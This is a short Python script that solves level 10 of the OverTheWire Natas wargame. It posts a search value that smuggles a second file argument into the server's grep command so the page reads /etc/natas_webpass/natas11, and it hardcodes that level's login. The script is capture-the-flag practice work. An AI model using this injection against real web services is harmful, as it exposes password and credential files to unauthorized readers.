#!/usr/bin/env python

import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

#response = requests.get(url, auth = (username, password), headers = headers)
session = requests.Session()

response = session.post(url , data = {"needle":". /etc/natas_webpass/natas11 #", "submit":"submit"}, auth = (username, password) )
#response = session.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit":"submit"}, auth = (username, password) )
content = response.text

#print session.cookies['loggedin']
#print content
 
print re.findall('<pre>\n(.*)\n</pre>', content)[0]